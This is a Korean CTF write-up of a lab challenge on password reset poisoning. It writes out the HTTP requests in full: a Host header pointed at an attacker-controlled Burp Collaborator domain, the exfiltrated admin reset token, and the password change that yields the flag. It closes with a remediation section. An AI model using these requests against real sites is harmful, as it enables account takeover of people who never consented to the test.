+++
title = "VulnABLE CTF [LUXORA] Write-up: Password Reset 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Password Reset", "Bronze", "Host Header", "Account Takeover", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Password Reset 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Password Reset)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/pass-reset/bronze`
- **목표**: 비밀번호 찾기(Reset) 기능에서 발생하는 로직 결함(Host Header Injection)을 파고들어, 타겟 사용자(Admin)의 비밀번호 재설정 링크를 가로채고 계정을 탈취(Account Takeover)하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 기능 분석 (Reconnaissance)

`/pass-reset/bronze` 경로에 접근하여 비밀번호 찾기 기능을 테스트해봅니다. 내 이메일 주소(`user@luxora.test`)를 입력하고 'Send Reset Link' 버튼을 누릅니다.

**[정상 요청 패킷]**
```http
POST /pass-reset/bronze HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

email=user@luxora.test
```

**[정상 응답 (메일 발송 시뮬레이션)]**
```html
<p>An email has been sent to user@luxora.test with the following link:</p>
<pre>http://localhost:3000/reset?token=a1b2c3d4e5f6</pre>
```

**[해커의 사고 과정]**
1. 이 시스템은 사용자가 이메일을 입력하면, 해당 이메일로 링크를 보내준다.
2. 생성된 링크를 보면 도메인 부분이 `http://localhost:3000`으로 되어 있다.
3. 이 도메인은 어디서 온 것일까? 이전에 수행했던 `Header Injection` 챌린지와 유사하게, 내가 보낸 HTTP 요청의 **`Host` 헤더**를 읽어서 동적으로 만들었을 확률이 높다.
4. 만약 내가 타겟 이메일(`admin@luxora.test`)을 적고, `Host` 헤더를 내 서버 주소로 바꾼다면?
5. 시스템은 `http://[내_서버]/reset?token=...` 이라는 링크를 만들어 관리자에게 메일로 보낼 것이다!

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Target: admin@luxora, Host: attacker.com)--> [ Web Server ]
                                                             |-- Sends email to Admin
[ Admin ]    --(Clicks Link)-------------------------------> [ Attacker Server ]
                                                             |-- Token Stolen!
```


이른바 **Password Reset Poisoning (비밀번호 재설정 포이즈닝)** 기법입니다.
관리자가 의심 없이 메일 안의 링크를 클릭하도록 유도하여, 비밀번호 재설정에 필요한 유일한 열쇠(Token)를 훔쳐오는 것이 목표입니다.

### 💡 공격 시나리오
1. 해커는 Burp Suite를 열어 패스워드 리셋 요청을 가로챕니다.
2. `Host` 헤더를 해커가 통제하는 서버(예: `evil-hacker.com` 또는 Burp Collaborator)로 조작합니다.
3. 대상 이메일(Target Email)란에 관리자의 이메일(`admin@luxora.test`)을 적어서 보냅니다.
4. 서버는 "관리자님, 패스워드를 재설정하려면 `http://evil-hacker.com/reset?token=XYZ...` 를 클릭하세요"라는 메일을 관리자에게 발송합니다.
5. (시뮬레이션 봇에 의해) 관리자가 메일의 링크를 클릭합니다.
6. 해커의 서버에는 관리자의 브라우저가 보낸 GET 요청이 찍히고, 해커는 그 요청에 포함된 `token=XYZ...` 값을 획득합니다.
7. 해커는 획득한 토큰을 원래 사이트(`http://localhost:3000/reset?token=XYZ...`)에 입력하여 관리자의 비밀번호를 자신의 마음대로 변경합니다.

---

## 🚀 3. 공격 수행 및 토큰 탈취

### Step 1: Poisoned Reset Request 전송
Burp Suite의 Repeater를 이용하여 조작된 패킷을 쏩니다. (OOB 테스트용 Collaborator 주소 사용)

```http
POST /pass-reset/bronze HTTP/1.1
Host: abc123xyz.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=admin@luxora.test
```

**[서버 응답]**
```html
<p>Password reset email has been dispatched.</p>
```

### Step 2: 토큰 탈취 (Token Exfiltration)
잠시 후, 챌린지 환경의 봇(Admin Bot)이 메일을 확인하고 링크를 클릭합니다.
해커의 Burp Collaborator 로그에 다음과 같은 HTTP GET 요청이 도착합니다.

```text
[HTTP Request Received]
GET /reset?token=admin_reset_token_8899aabbcc
Host: abc123xyz.burpcollaborator.net
```
관리자 전용 비밀번호 재설정 토큰(`admin_reset_token_8899aabbcc`)을 손에 넣었습니다!

### Step 3: 비밀번호 변경 및 계정 탈취 (Account Takeover)
획득한 토큰을 정상적인 LUXORA 플랫폼의 리셋 페이지에 대입합니다.

```http
POST /reset-password HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

token=admin_reset_token_8899aabbcc&new_password=hacked123
```

**[서버 응답]**
```html
<h2>Password updated successfully!</h2>
<p class="flag">FLAG{PASS_RST_🥉_POISON_BOLA_A1B2C3}</p>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

단순한 Header Injection 취약점이 비즈니스 핵심 로직인 "비밀번호 재설정" 과정과 결합되었을 때, 타인의 계정을 완전히 탈취(Account Takeover)하는 파괴적인 결과로 이어짐을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{PASS_RST_🥉_POISON_BOLA_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자에게 이메일로 링크를 발송할 때, 클라이언트가 조작할 수 있는 HTTP 헤더를 기반으로 도메인을 생성한 것이 근본 원인입니다.

* **안전한 패치 가이드 (정적 도메인 사용)**
비밀번호 재설정 링크, 가입 확인 링크 등 외부로 발송되는 메일 내부의 모든 링크는 어플리케이션 설정 파일(환경 변수)에 고정된(Hardcoded) 도메인 주소만을 사용해야 합니다.

```javascript
// 서버 백엔드 설정 (Node.js 예시)
const SITE_URL = process.env.BASE_URL || "https://www.luxora.test";

// 이메일 발송 템플릿
const resetLink = `${SITE_URL}/reset?token=${resetToken}`;
sendEmail(user.email, resetLink);
```
이렇게 수정하면 해커가 `Host` 헤더를 아무리 변조해도, 발송되는 이메일에는 항상 안전한 원본 도메인(`https://www.luxora.test/reset...`)만 적히게 되므로 공격이 불가능해집니다.